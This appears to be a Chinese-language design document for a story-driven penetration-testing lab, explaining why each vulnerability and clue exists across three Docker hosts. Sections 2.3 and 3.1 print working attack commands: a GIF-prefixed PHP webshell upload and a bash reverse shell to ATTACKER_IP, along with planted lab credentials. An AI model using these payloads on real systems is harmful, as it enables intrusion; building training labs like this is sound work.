# BLACK ARCHIVE — 攻擊鏈設計文件

> 這份文件是**設計文件**，回答「怎麼設計的」——每個漏洞/線索為什麼在這裡、
> 對應哪個敘事功能、跟哪些既有內容互相印證。裡面也帶著完整的 exploit 指令，
> 但那是為了讓設計說明可以對照實際指令驗證，不是給你照抄的操作記錄。
>
> 如果只想要「打的時候發現了什麼、測試了什麼、成功了什麼、下一步做什麼」
> 這種精簡操作記錄，看 `../Answer/walkthrough.md`——那份不解釋任何設計理由。
>
> 對照文件：`legacy-mechanics.md`（原始 VulnCastle 攻擊鏈凍結記錄）、
> `../Answer/evidence-map.md`（每份證據的敘事功能與已修正的 bug）、
> `characters.md` / `timeline.md` / `truth-map.md`（人物與真相，本資料夾）、
> `../Answer/truth-zh.md` / `../Answer/truth-en.md`（完整故事，敘事體）、
> `player-knowledge-states.md`（玩家在每個階段應該知道什麼）。

---

## 0. 架構總覽

```
攻擊機 (Kali)
     │
     ▼
┌─── DMZ 172.20.1.0/24 ─────────────────────────────┐
│  frontier  172.20.1.10   host:8080(http) 8025(webmail) │
│  relay     172.20.1.12   無 host port，dual-homed ─────┼──┐
└─────────────────────────────────────────────────────┘  │
                                                           │
┌─── Internal 10.10.0.0/24（internal: true，不對外）───────┘
│  relay   10.10.0.12  (別名 relay.internal)                │
│  archive 10.10.0.15  (別名 cairn.internal，無任何 host port) │
└───────────────────────────────────────────────────────────┘
```

- 三台 host 各自是一個 container，內部用 supervisord 跑多個 process（原本 VulnCastle 是 7 台獨立 container）。
- 只有 `frontier` 對外映射 port（`8080`/`8025`）。`relay` 跟 `archive` 都完全不映射 port 到宿主機 — 從攻擊機的角度，`nmap -p- TARGET` 只看得到 frontier 這兩個 port，relay 跟 archive 都必須先在 frontier 拿到執行權限，再從 container 內部直連對方的 IP 才碰得到（兩者都在 dmz bridge network 上，container 間互通不需要額外的 port mapping）。這是這一輪修正的重點：原本 relay 的 SSH（`2222:22`）直接映射到宿主機，導致第一次全端口掃描就會看到 relay 的服務，破壞「先攻破 DMZ，才發現內部還有一台」的真實感；現在跟 `archive` 的做法一致，逼玩家真的走一次 pivot。
- `archive` 完全不映射 port 到宿主機，只能從 `relay` 所在的 internal network 抵達 — 必須真的建立 pivot。
- 部署指令：`./start.sh`，或手動 `docker build -t black-archive-base:latest ./lab/base/ && docker compose up -d --build`。
- 本文件裡的指令都是在「攻擊機跟受害機是同一台」或「用 docker host 的 LAN IP」兩種情境下都能用，把 `TARGET` 換成你打靶時實際用的 IP 即可（這次部署測試時是 `192.168.3.134` / `192.168.52.135`，視你的網卡而定）。
- **中文版**：`docker-compose.zh.yml` 用同一套 Dockerfile/程式碼，只是帶 `--build-arg LANG=zh`，跑在不同 port（`18080`/`18025`）跟不同的 network/container 名稱，可以跟英文版同時存在。玩家看到的網站文字、notes、webmail、CAIRN 六份文件、SMB 分享裡的文件、最終的 `cairn_disposition_review.txt` 全部翻成中文，但漏洞機制、帳密、案件編號、`transfer_ref`、SSH key 完全不變——中文版就只是換了一層皮的同一個 lab，不是另一個獨立維護的版本。實作方式是把每個 app 裡原本寫死的英文字串抽成 `content_en.*`/`content_zh.*`（PHP/Python/JS 各一份），Dockerfile 在建置時期依 `ARG LANG` 選一份複製成 `content.*`，程式邏輯本身完全不判斷語言；notes/SMB 分享/根目錄文件這類純文字檔案則是整個資料夾複製一份 `-zh` 版本，同樣在建置時期選擇要用哪一份。`smb.conf`、`sync.conf`/`audit_note.txt` 的 credential 相關行、以及兩份 PDF 掃描件（`acquisition_directive_scan.pdf`、`disposition_order_2547-014.pdf`）目前沒有中文版——PDF 視覺掃描件重做的效益太低（內容跟已翻譯的 `.txt`/record 101 重複），先跳過。實際逐頁檢查畫面時抓到兩個真的 bug，都已修好：首頁的 Webmail 快速連結原本寫死 `:8025`，中文版（host port 是 `18025`）會連錯，改成讀 `WEBMAIL_PORT` 環境變數（frontier Dockerfile 預設 `8025`，`docker-compose.zh.yml` 覆寫成 `18025`）；而這個環境變數一開始傳不進 PHP，是因為 php-fpm 預設 `clear_env=yes` 會清掉 worker 的環境變數，改成 `clear_env=no` 才生效。CAIRN 六份文件的標題（`<title>` 跟 dashboard 索引列表）第一輪只翻了內文忘了翻標題，後來也補上了。

---

## 1. 設計原則回顧（為什麼會長這樣）

1. **漏洞機制原封不動沿用 VulnCastle**，只換敘事外皮（原始清單見 `legacy-mechanics.md`，那是凍結記錄，不隨後續修剪更新）。理由見 `BLACK_ARCHIVE_Modification_Plan.md` §19。**這份清單本身在第十三輪後已經不等於目前的實際漏洞集合**——見原則 7。
2. **沒有 CTF 解謎感**：沒有 Base64/ROT/steganography/密碼謎語，所有「解謎」都是資安 enumeration 或劇情層面的交叉比對。
3. **資安 ≠ 唯一難度來源**：這一輪修正後，加入了三個純粹靠推理才能解開的節點（見第 3.3、4.4、5.4 節），不是打完漏洞就結束。
4. **不要 brute force 當主要 progression**：每一組要用到的密碼都有合法（非暴力破解）的發現管道，見附錄 B。
5. **Flag 不是 `FLAG{}`**：每個原本的 flag 節點都換成一份真的文件（memo / DB 列 / SMB 檔案 / admin panel 紀錄）。
6. **這不是一個「為了被駭而存在」的環境，是一個真環境，玩家只是恰好在調查它**：這一輪特別加強了訊噪比——搜尋索引從 3 筆加到 7 筆（另外 4 筆是普通對照組）、`/notes/` 從 3 個檔案加到 6 個、webmail 從 3 封信加到 11 封、`service_accounts` 加了 2 筆死線索、SMB 三個分享都各加了 1 份純填充文件。這些新增內容**全部跟劇情/漏洞無關**，目的是讓玩家自己分辨「這個值得看」跟「這只是辦公室的日常雜物」，而不是每個列出來的東西都注定是線索。下面每一節看到「純填充」「死線索」字樣的地方，都是刻意加入的噪音，不是漏改的殘留內容。
7. **一條攻擊鏈，不要多餘的漏洞**（第十三輪起）：每個 host 只保留一條通到下一關的必經路徑；「多選一」的立足點/提權分支、跟主線拿到同一份東西的第二條路、以及打穿也不會給你任何額外資訊的漏洞（純示範用的 SSRF/command injection/path traversal、無認證但完全沒東西可拿的 Redis），一律砍掉，不當「反正留著也沒差」的裝飾。判斷標準：**兩個漏洞如果拿到一樣的東西，只留一個；一個漏洞如果拿完之後沒有任何新資訊、也不是往下一關的必經路，直接砍**。FRONTIER、RELAY 現在都沒有本機 root 提權——兩台的 root 本來就解鎖不了任何東西，留著只是「反正可以打」的兔子洞。細節見 `../Answer/evidence-map.md` 第十三輪。
8. **玩家該是因為在追查才去打漏洞，不是因為看到漏洞形狀就該測**（第十六輪起）：漏洞機制本身不因這條原則而改變，改變的是玩家抵達每個漏洞的理由——案件卡自己露出異常、Case File Intake 被框成案件文件的唯一入口、密碼線索拆成兩份文件讓玩家自己推論、第一次 shell 後立刻有故事回饋而不是只有技術進度。盲測標準：玩過的人如果被問「你為什麼決定測這個」，答案應該是調查動機，不是「反正這是 CTF，有這功能就該測」。細節見 `../Answer/evidence-map.md` 第十六輪。

---

## 2. ACT I — FRONTIER（172.20.1.10, host:8080 / :8025）

### 設計意圖
玩家此時只知道 LONGSHORE 給的三個名字（開場委託信現為線上 artifact，`briefing/` 本機目錄已移除）。FRONTIER 要讓玩家從「這三筆資料看起來普通」走到「這系統本身有問題」，但**絕對不能**提到 ONI / SPARTAN-II / Halsey。

### 2.1 Recon
```bash
nmap -sC -sV -p- TARGET
# TARGET 是 docker host 的 IP。只有 frontier 對外映射 port：
# 預期：8080/tcp http (nginx，容器內部是 80，host 映射成 8080)、
#      8025/tcp http (Python BaseHTTPServer, webmail)
# relay 跟 archive 都沒有映射任何 host port，這次掃描完全看不到它們 —
# 這正是重點：從攻擊機的視角，一開始只有一台 server、兩個 port，
# 「這裡還有別的host」是要靠攻破 frontier 之後才會發現的事，不是掃描就送出來的。
```
逛 `http://TARGET:8080/`，導覽列有 Home / Dependent Status Index / Case File Intake / Network Diagnostics / Support Tickets。

### 2.2 用 LONGSHORE 給的名字做真正的 recon（不是裝飾用頁面）
```bash
curl "http://TARGET:8080/?page=search&q=Okafor"
curl "http://TARGET:8080/?page=search&q=Wren"
curl "http://TARGET:8080/?page=search&q=Farrow"
```
三筆都查得到，回傳真的案件卡（含案件卡圖片、`case_ref`）：
- Eli Okafor — Eridanus II — `OCPA-R4-11902` — Case Closed, Deceased (age 6)
- Talia Wren — Madrigal — `OCPA-R4-11944` — Case Closed, Deceased (age 6)
- Dominic Farrow — Skopje — `OCPA-R4-11887` — Case Closed, Deceased (age 6)

`$DEPENDENT_INDEX` 這個搜尋後端其實有 **7 筆**公開可查的紀錄，不只 LONGSHORE 給的這 3 筆：另外 4 筆（Priya Anand / Marcus Webb / Dana Song / Theo Alvarez）是刻意放進去的對照組——都是普通、平凡的案件，狀態各自是 Active / Active / Active / Closed-relocated，沒有任何異常欄位。玩家如果好奇多搜尋幾個名字，看到的應該是「大部分紀錄都很正常」，這樣 3 筆有問題的紀錄才顯得異常，而不是讓玩家覺得「這整個系統都是為了劇情設計的」。relay 的 MariaDB 裡還有 2 筆（Nadia Oyelaran / Kenji Park）**只存在 DB 裡，這個公開搜尋介面查不到**，屬於 Act II 才會看到的背景資料，見 3.3 節。

**這一輪新增**：LONGSHORE 給的這 3 筆案件卡（搜尋結果列表跟詳細頁都有）現在多一個 `Internal transfer ref:` 欄位（`SPINDLE-7-0119` / `-0142` / `-0087`），其他 4 筆對照組完全沒有這個欄位。玩家不需要先去翻 Support Tickets 才知道「有異常」——只要查過這 3 個名字，自己就會在案件卡上看到一個其他案件都沒有的欄位，這是玩家自己觀察到的第一手異常，不是被 T. Reyes 的工單告知的。todo.txt（見 2.4 節）現在講的是同一件事的精確版本：「這 3 筆是整個索引裡唯一這欄還有值的已結案案件」，用來確認玩家自己看到的東西不是巧合，而不是第一次告知這個事實。

`?q=` 原本有 reflected XSS，`?page=ping` 原本有 command injection，`?page=notes&file=` 原本有 path traversal——這三個都跟 upload 一樣能拿到 www-data，屬於「多選一但拿到同一個東西」，第十三輪已經全部修掉，只留 upload 這一條唯一的立足點（理由見原則 7）。`ping` 頁面本身還在（`escapeshellarg()` + hostname 格式驗證，正常能 ping），`notes` 也還在（`basename()` 擋掉 `../` traversal），只是不再是漏洞。

### 2.3 拿初始立足點（www-data）

`?page=upload`（Case File Intake）的頁面文字這一輪改寫過：現在明講「這是案件結案後唯一還能新增/補正文件的管道」，首頁的系統公告也同步改成一樣的說法。玩家會去碰這個功能，理由是「這 3 筆案件的原始 intake 資料是從哪裡進來的、能不能透過同一個管道拿到更多」，而不是單純「CTF 網站有 upload 就該測」——底層漏洞完全沒變，只是玩家抵達這裡的理由不一樣了。

**Unrestricted Upload**：`?page=upload` 用 `getimagesize()` 擋掉非圖片檔（todo.txt 標成 SEC-1188 已修），但沒有 extension allowlist、沒有 rename，`.php` 副檔名照樣被 php-fpm 執行。`getimagesize()` 只檢查檔頭結構，不驗證檔案其餘內容 —— 在合法 GIF 檔頭（`GIF89a` + 最小 logical screen descriptor）後面直接接 PHP payload 即可過檢查，且必須手動拼 multipart body（Burp Repeater 或 curl `--data-binary`），不能只是在檔案選擇對話框挑一個 `.php`：
```bash
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00<?php system($_GET["c"]); ?>' > shell.php
curl -F "file=@shell.php;type=image/gif" "http://TARGET:8080/?page=upload"
curl "http://TARGET:8080/uploads/shell.php?c=id"
```

**這一輪新增，第一次拿到程式碼執行後的即時故事回饋**：`/var/backups/roster/reyes_scratch.txt`——T. Reyes 自己留下、從沒打算被讀到的私人筆記，不在 `notes/` 目錄底下、nginx 沒有服務這個路徑，`?page=notes&file=` 的 `basename()` 限制也構造性地碰不到它（`../` 會被收斂回 `notes/` 目錄內），**只有真的拿到程式碼執行、能讀任意檔案系統路徑之後才碰得到**：
```bash
curl "http://TARGET:8080/uploads/shell.php?c=cat+/var/backups/roster/reyes_scratch.txt"
```
內容是 2.2 節案件卡上那個新欄位的「人工版驗證」：T. Reyes 自己把整個索引的已結案案件都比對過一輪，確認就是這 3 筆案件、只有這 3 筆帶著 `transfer_ref`，其他已結案案件全部是空的。玩家在拿到第一個 shell 後幾秒鐘內，就能得到一個「只有突破後才確認得到」的故事事實，形成正回饋，而不是純技術上的立足點——但這裡仍然只是「確認異常真的存在、且被人注意到但沒人深究」，不解答異常是什麼，跟 §2.6 的推理節奏一致。

### 2.4 Support Tickets — 建立懷疑 + 找到合法密碼來源
```bash
curl "http://TARGET:8080/?page=notes&file=welcome.txt"
curl "http://TARGET:8080/?page=notes&file=todo.txt"
```
`welcome.txt` 第一次出現「SPINDLE」這個退役系統代號；`todo.txt` 暗示有案件的 transfer reference 對不起來，但被當成「批次匯入的假影」揭過。

**關鍵一步**：`/notes/` 目錄本身有 autoindex 誤設（真實世界常見的 misconfig），可以列出導覽列沒連結的檔案：
```bash
curl "http://TARGET:8080/notes/"
curl "http://TARGET:8080/?page=notes&file=credential_rotation_status.txt"
```
`/notes/` 目錄實際列出 **7 個檔案**，多出來的 4 個（`parking_permit_renewal.txt`、`elevator_status.txt`、`supply_closet_note.txt`、`t_reyes_annual_review_2546.txt`）是純填充內容，跟劇情/漏洞無關——刻意讓這個 autoindex 看起來像真的辦公室共用資料夾裡會有的雜物，不是「一列出來就知道哪個檔案是重點」。`t_reyes_annual_review_2546.txt` 是 T. Reyes 本人的年度考核，純粹強化他既有的抱怨語氣（跟 todo.txt 一致），不帶線索，會掛他的頭像。

`credential_rotation_status.txt` 這份文件現在只回報「terminal/webmail 人員帳號」的輪替狀態，不再一次性倒出四組帳密：`devuser` 已在去年稽核後完成 first-login 輪替（死線索）、`deploy` 已隨舊系統一併停用（死線索），只有 `sysadmin` 還卡在 Security 簽核。這份文件明確寫「機器/服務帳號由 Ops 另外追蹤」——`backup` 帳號完全不在這份清單裡，它的密碼只能靠 3.3 節 relay 的 `service_accounts` 資料表另外找到，兩條發現管道刻意分開，不是同一份文件重複重用。頁面上如果順手看一下 `?page=notes&file=welcome.txt` 旁邊列的其他人員，會看到 T. Reyes 的頭像（`t_reyes.jpg`，真實照片素材）掛在留言旁邊——純粹增加真實感，不帶任何線索。

**這一輪拆開的密碼線索**：`credential_rotation_status.txt` 這一輪不再直接寫出 `sysadmin:admin123` 這組明文帳密，只講「`sysadmin` 從來沒經過 first-login 輪替，還在用 provisioning 範本的預設值（範本目前的預設值可以查新人須知）」；真正的預設值 `admin123` 搬到 `welcome.txt`（2.4 節本來就會讀到）裡，用一句跟任何特定帳號無關的通用政策描述（「每個新開的帳號都還是用同一套 provisioning 範本，直到有人強制輪替」）交代。玩家要自己把「A：範本預設密碼是 admin123」+「B：sysadmin 沒輪替、還在用範本預設值」兩份獨立文件的資訊接起來，才能推出 `sysadmin/admin123`——沒有增加任何猜測/解謎難度（兩份文件都直接讀得到，密碼本身完全沒有變複雜），純粹是把「设计者把鑰匙直接放在一個檔案裡」的感覺，換成「玩家自己做了一步推論」。

### 2.5 Webmail（8025）— 憑證重用的起點
```bash
curl -X POST http://TARGET:8025/login --data "user=sysadmin&pass=admin123"   # 302 -> /inbox，設 session cookie
```
webmail 的登入帳號 `sysadmin` 剛好也是 base image 的真實 OS 帳號 — 這是刻意設計的「密碼重用」示範，不是巧合。

**這一輪清掉的兩條冗餘旁路**：webmail 原本同時有兩種不用密碼就能讀信箱的方式——`/debug` 端點洩漏環境變數拿到 `duty.admin/MailP@ss2024`（一組跟主線密碼重用主題無關、且從沒被其他地方消費過的次要帳密）；`/inbox` 本身完全沒有 session 驗證，直接 GET 就能看到全部信件，等於讓 2.4 節辛苦推出來的 `sysadmin/admin123` 變得可有可無。兩條路只留一條：`/debug` 整個端點連同 Dockerfile 裡那三個只為了餵它的 stale env var 一起移除；`/inbox` 補上跟 CAIRN Records Terminal 同一套 session cookie 機制，沒有有效 cookie 一律 302 回登入頁。現在讀信箱唯一的路，就是 2.4 節推論出來的那組密碼——這是唯一保留、也是唯一跟故事有關的那條 credential 路徑。

登入後看 `/inbox`（**共 18 封信**）。18 封裡有 **7 封跟劇情/漏洞有關**，剩下 11 封是刻意加的填充信件（合規訓練提醒、停水通知、電梯維修、印表機耗材、印表機抱怨、午餐訂購閒聊、patch window 通知、物料補貨、門禁卡停用，加上 3 封 2555 年的近期信件——新印表機、Q1 費用報告、消防演習——確保這個信箱看起來是「現在還在用」，不是一個停在 2547 年的歷史快照）——玩家要自己從一堆無聊的辦公室信件裡認出哪幾封重要，這是這輪特別加強的「訊噪比」設計，不是隨便塞信件湊數。

七封關鍵信（依收件時間混雜在其他信件中間，不會排在一起）：
1. "LEDGER Terminal Access" — 提到一個叫 `svc-relay` 的帳號，**這是死線索**（該帳號根本不存在），但正確指出目標是 `relay.internal`。
2. "LEDGER sandbox refresh" — `root / S3cretDB!2024`，跟後面 RELAY 的 DB root 密碼**互相驗證**（多來源交叉確認同一組密碼，強化玩家信心）。
3. "New Case Handler Onboarding" — 官方說法定調「這只是 SPINDLE 遺留的匯入假影」，跟 todo.txt 的說法一致，替後面的官方稽核回應（3.4 節）先埋一個伏筆。
4. "RE: RE: SPINDLE decommission - final sign-off checklist" — 巢狀引言的多部門工單串（Compliance 的 S. Andrade、Records 的 N. Okafor、Systems 的 T. Reyes 各答一段），N. Okafor 在裡面**當下**就抱怨過 transfer_ref 對不起來、被上級用「已知的migration artifact」打發——這是玩家在 Act I 就能看到、但要到 Act III 才會意識到重要性的伏筆，也是 N. Okafor 這個名字第一次出現在玩家眼前。
5. "you're not going to believe this" — T. Reyes 對同事私人抱怨：跟主管反映 transfer_ref 異常，得到「跟複製貼上一樣，一字不改」的官方說法——表面看是他個人在發牢騷，實際上是**點名「官方說法異常一致」這件事本身**的關鍵一句，跟下面兩封殖民地行政公文一起構成 §2.6 推理節點的材料。之前幾輪一直把這封歸類成純填充閒聊信，這輪重新定義成推理素材。
6. "RE: Case status inquiry - OCPA-R4-11902" — Records 回覆 Eridanus II 殖民地行政單位的 V. Dumont，語氣公式化地打發掉一個「代表某個 constituent」多年來反覆詢問 Eli Okafor 這筆已結案案件的外部詢問。
7. "RE: Follow-up - dependent case OCPA-R4-11944" — 同樣的模式，換了一個殖民地（Madrigal）、換了一個行政單位聯絡人（J. Brandt），對象是 Talia Wren 的案件，Records 的回應甚至提到「這已經是回覆你們單位第二次問一樣的問題了」。

### 2.6 【推理節點 0】官方統一話術，跟誰還在持續關注這三個案子

這是這一輪為了平衡「資安 vs 推理」比重新增的節點——Act I 原本純粹是技術性的 enumeration（找立足點、找密碼），沒有任何需要玩家自己下判斷的推理節點，跟 Act II（3.4 節）、Act III（4.4/4.5/4.5b 三個節點）的密度不成比例。這裡的推理不需要任何 Act II/III 才有的資料，純粹用 Act I 自己已經給的三組獨立線索：

1. **搜尋結果的比例本身就是異常**：7 筆公開搜尋結果裡，剛好只有 LONGSHORE 給的這 3 筆是「Case Closed - Deceased (age 6)」，其他 4 筆是 Active 或平凡的搬遷結案——玩家如果多搜幾個名字，會自己注意到這 3 筆在統計上就是格格不入。
2. **官方說法異常統一**：`welcome.txt`、`todo.txt`、webmail 的 "New Case Handler Onboarding" 這三個完全獨立的來源（給新人的口頭傳承、系統人員的私人待辦、Records 對全體 handler 的正式公告），對同一件事給出幾乎逐字相同的說法——「這只是 SPINDLE 遷移留下的假影，不用管」。T. Reyes 自己在私人信裡（"you're not going to believe this"）直接點出這個異常：他跟主管反映同一件事，得到的答案「跟複製貼上一樣，一字不改」——這句話本身就是在提示玩家「這個一致性不是巧合，是有人在統一口徑」。
3. **這個「假影」剛好黏著 LONGSHORE 名單裡的其中兩個案子，而且黏了很多年**：兩封殖民地行政單位的公文（Dumont / Brandt）分別在詢問 Okafor 跟 Wren 的案子，兩邊都被 Records 用幾乎一樣的公式化語言打發，而且都明確提到「這不是第一次問了」「已經持續好幾年」。如果 SPINDLE 遷移的資料異常真的只是隨機的批次匯入雜訊，不會剛好是 LONGSHORE 名單裡的名字持續吸引外部單位跨年詢問——第三個名字（Farrow）這裡沒有對應的公文，玩家看到的是「三筆裡至少兩筆」這種不完美但仍然顯著的統計訊號，不是刻意湊好的三對三。

玩家在這裡應該得出的結論，不是「官方在說謊」（那要到 Act II/III 才有實質證據），而是**「官方的說法太一致、太方便，一致到不像自然發生的」**——這是一個建立懷疑的節點，不是給答案的節點，跟後面 3.4/4.4/4.5/4.5b 節「證據互相矛盾、遊戲不告訴你誰對」的處理方式一致，不會提前劇透。（Dominic Farrow 這裡刻意不給對應的殖民地行政公文——三個名字裡留一個沒有這條支線，避免玩家覺得「每個名字都剛好有一封對應的信」太過工整，像是硬湊出來的規律。）

### Act I 結論（玩家此時應該知道的）
三筆名字是真的、系統裡有個叫 SPINDLE 的退役系統、有個叫 LEDGER 的內部系統、拿到一組會員密碼 `sysadmin/admin123`；而且應該已經對「這只是遷移假影」這句官方說法產生懷疑——不是因為看到了矛盾的證據（那是 Act II 的事），而是因為這句話太一致、用得太剛好，剛好只蓋住這三個名字。**還不知道** ONI 涉入這起案件、不知道 Section III 這個內部單位，也不知道這起案件跟 SPARTAN-II 有什麼關係，更還沒有任何實質證據能反駁官方說法。

---

## 3. ACT II — RELAY（dmz: 172.20.1.12 / internal: 10.10.0.12，無 host port）

### 設計意圖
玩家第一次意識到「這不只是資料錯誤，是被刻意搬走的資料」。ONI Section III / Cmdr. Petrov 第一次出現。同時這裡也是「先攻破 frontier 才能碰到 relay」這個 pivot 動作真正發生的地方——relay 完全不對外開 port，SSH 只能從已經在 dmz 網段裡的機器（也就是 frontier）連進去。

### 3.1 從 FRONTIER 取得的立足點做 pivot
先在 2.3 節任一條路拿到 frontier 上 `www-data` 的執行權限，但那是靠 URL 參數執行單一指令的 webshell，沒有真正的互動式終端機，直接打 `ssh` 會卡在密碼互動提示上。要先把它升級成一個真正的互動式 shell：
```bash
# 1. 從 webshell 開一個 bash reverse shell 回自己的 nc listener
nc -lvnp 4444        # 攻擊機這邊先聽
curl "http://TARGET:8080/uploads/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"

# 2. reverse shell 接到之後升級成真正的 TTY（frontier 的 base image 有 python3）
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z 回攻擊機，再：
stty raw -echo; fg
export TERM=xterm

# 3. 現在有真正的互動式終端機了，直接 ssh 進 relay（dmz 網段內互通，不用任何 port 映射）
ssh sysadmin@172.20.1.12        # 或 ssh sysadmin@relay.internal
# 密碼：admin123（跟 webmail 同一組）
```
relay 是 dual-homed：DMZ 側 `172.20.1.12`、Internal 側 `10.10.0.12`。SSH 進去之後，這台機器本身也在 172.20.1.0/24 上，如果你不想每次都真的 SSH 進去，其實可以直接從 frontier 的 container 對 relay 的 dmz IP 做內部掃描，直連 relay 的 `3000`（API）、`3306`（MariaDB）——因為 dmz 是普通 bridge network，同網段互通，這是刻意保留的「已經在內網就能少走一步」彈性，不是必經路徑；但要讀 relay 本機檔案系統（`/etc/ledger/sync.conf`，見 3.3b）還是需要真正的 shell。

### 3.2 LEDGER API（relay 的 3000 port，只在 internal-facing，不對 host 開 port）
```bash
curl http://127.0.0.1:3000/                       # 列出全部 endpoint（在 relay 本機執行；從 frontier 直連則用 172.20.1.12:3000）
curl http://127.0.0.1:3000/api/cases               # 列出全部案件，但只有 id/name/colony 摘要
curl http://127.0.0.1:3000/api/cases/1              # 完整紀錄（IDOR：無授權檢查）— Eli Okafor，帶 transfer_ref: SPINDLE-7-0119
curl http://127.0.0.1:3000/api/cases/5              # 完整紀錄不是案件，是系統帳號：ledger-cairn-sync
curl http://127.0.0.1:3000/api/health                # internal_services.archive_fileshare 只回 "degraded"，不再直接給 hostname/port
```
**這一輪修正**：`/api/cases`（列表）原本直接把每筆的完整內容（含 `transfer_ref`、`case_ref`、id 5 的 `api_key`）一次全倒出來，等於 `/api/cases/:id` 這個「無授權檢查」根本沒有意義可言——列表本身就已經給了一切，IDOR 標籤名不副實。改成列表只回傳 `id`/`name`/`colony`（id 5 只回傳 `id`/`type`），完整內容只有指定 id 單獨查詢才拿得到，`/api/cases/:id` 才真的是「沒有授權檢查，任何 id 都能查」的 IDOR，不是列表的重複輸出。`/api/health` 原本直接把 `cairn.internal:445` 寫在 `internal_services.archive_fileshare` 裡——一個完全不用認證、關卡最早期就打得到的 endpoint，直接把下一台主機的位址交出來，太乾脆了。改成只回報服務異常狀態（`"degraded"`），不給位址：真正的 `cairn.internal` 主機名稱要靠 3.3 節 MariaDB 的 `service_accounts` 表或 3.3b 節的 `sync.conf` 才找得到，這兩個管道都需要先站穩 relay 這台才拿得到，比未認證 API 更合理的難度曲線。

關鍵發現：`/api/cases/1~3` 都是「已結案死亡」卻帶有一個不該存在的 `transfer_ref`（`SPINDLE-7-01xx`）。`/api/cases/4`（Priya Anand）沒有 `transfer_ref` —— 這是刻意放的對照組，讓玩家自己比較出「不是每筆資料都異常」。

（第十三輪移除：原本這個 API 還有 `/api/fetch?url=` SSRF、`/api/diagnostics` command injection、`/api/files?name=` path traversal 三個「示範用」的洞——SSRF/path traversal 拿到的東西跟 `/api/health` 已經給的資訊重複，command injection 在修掉 supervisord 的 root 執行問題之前，甚至是一條從 frontier 就能直接打、完全不用先拿 relay shell 的意外 root 捷徑。三個都跟主線沒有關係，也不會給任何獨有資訊，已經整段刪除，不再是這台的攻擊面。）

### 3.3 MariaDB — 真正的憑證與稽核矛盾來源
```bash
# 要用真正的網路連線（relay 的實際 IP），不要用 localhost/127.0.0.1 —
# 那會走 unix socket，root 會直接免密碼通過（另一個問題，見下方 debug note）。
# 這台 MariaDB client 版本預設會要求 TLS，遠端連線要加 --skip-ssl。
mariadb -h relay.internal -u root -p'S3cretDB!2024' --skip-ssl ledger
```
> **Debug note（已知但刻意不修的行為）**：如果你是直接在 relay 主機本地（例如已經 SSH 進去）用 `mariadb -u root -pS3cretDB!2024`（不加 `-h`），MariaDB 預設的 unix_socket 認證外掛會讓本地 `root` OS 使用者直接免密碼通過，密碼參數形同虛設。這是 Debian/Ubuntu MariaDB 套件的預設行為，不是這個環境刻意設計的漏洞，但如果你是從自己的攻擊機或其他 container 遠端連（真正的 pivot 情境），就一定要用密碼，行為才會跟上面一致。
```sql
SELECT * FROM service_accounts;
```
| service_name | username | password | host |
|---|---|---|---|
| CAIRN Fileshare | sysadmin | admin123 | cairn.internal |
| Gateway Maintenance SSH | backup | backup | relay.internal |
| Floor Print Server | printsvc | printsvc | printsvc.internal:9100（死線索，host 不回應） |
| Conference Room Booking | booking-svc | B00king2019 | roombook.internal:80（死線索，兩年前系統換掉了，只是沒人下架這筆） |
| Vending Machine Telemetry | vendtel | vendtel | vendtel.internal:8081（死線索，回報庫存用，跟劇情完全無關） |

`service_accounts` 現在共 **5 筆**，其中後三筆是純填充的死線索——真實環境裡這種「早就沒用但沒人清理的舊帳號」很常見，故意留著讓玩家自己判斷哪些值得追。CAIRN Fileshare 這筆再次驗證「同一組密碼到處重複用」（Samba 跟 SSH/webmail 共用）。**這張表不再直接給出 CAIRN Records Terminal 的帳密**——那組憑證要靠下一步的環境探索才找得到，不是單純 `SELECT *` 就拿到下一關全部鑰匙。（第十三輪移除了原本的「CAIRN Cache」一筆：那是 archive 上一個無認證的 Redis，除了「存在、沒東西可拿」之外沒有任何獨有資訊，整個 Redis 服務已經從 archive 拿掉。）

```sql
SELECT * FROM dependent_case_index;   -- 背景資料，共 10 筆：Act I 公開搜尋能查到的 7 筆全部都在這裡，
                                       -- 加上 3 筆只存在 DB 裡的（Samuel Voight 帶異常模式；
                                       -- Nadia Oyelaran / Kenji Park 純填充，無 transfer_ref）
SELECT * FROM system_migration_log ORDER BY entry_date;
```

### 3.3b CAIRN Records Terminal 憑證 — 要在檔案系統裡找
relay API 的 `/api/cases/5` 已經提過有個叫 `ledger-cairn-sync` 的服務帳號負責 LEDGER↔CAIRN 同步。真正的憑證在 relay 本機的服務設定檔裡（拿到 shell 之後找）：
```bash
cat /etc/ledger/sync.conf
```
```
sync_target_host = cairn.internal
sync_target_service = records-terminal
sync_target_port = 8080
sync_user = administrator
sync_pass = Records!Access99
```
這是「environment relationship → 找 config 檔 → 才發現憑證」，比一次 SQL SELECT 更貼近真實 pentest 的 credential discovery 手感。同目錄下還有一份 `audit_note.txt`（IT 人員 J. Marsh 留的工單筆記），純填充，說明 CAIRN 稽核紀錄在 2547-02-11 之前有兩天缺口——這解釋了 4.2 節 `cairn_access_log_extract.txt` 為什麼從那天才開始有紀錄，不是漏改，是刻意的邏輯支撐。

### 3.4 【推理節點】官方稽核 vs 你自己找到的證據
`system_migration_log` 第一筆（2540-08-02）是 Records Compliance Office 的正式結案回應：**「查過了，是批次匯入的假影，沒有異常」**。

問題是：你在 3.2 節已經親眼看過 `transfer_ref` 的模式，而且只出現在特定幾筆案件上，不是隨機雜訊。這裡遊戲**不告訴你官方是失職還是刻意淡化**——這是故意設計成矛盾、不給答案的節點，呼應作品核心要求「證據可以看似矛盾，玩家自己建立 hypothesis」。

### Act II 結論
玩家現在知道：這些孩子在系統裡被當成某種「candidate」處理、有個叫 CAIRN 的更高機密系統、ONI Section III 跟 Cmdr. Petrov 的名字第一次出現、官方紀錄跟你自己查到的東西對不上。**還不知道**案件跟 SPARTAN-II 之間的關聯、flash-clone 機制、Halsey 的角色。

RELAY 沒有本機 root 提權（第十三輪移除了原本的 SUID `spindle-legacy-diag`）：root 在這台解鎖不了任何東西（`/etc/ledger/sync.conf` 本身就是 644，`sysadmin` 就讀得到），留著只是一個打完也什麼都不會多知道的兔子洞。`socat` 還在，但只是給玩家自己拿來 pivoting/tunneling 用的工具，不是提權捷徑（原本掛在 `sudo -l` 上的 `NOPASSWD: /usr/bin/socat` 也已經在更早一輪移除）。

---

## 4. ACT III — ARCHIVE（internal: 10.10.0.15 / cairn.internal，無任何 host port）

### 設計意圖
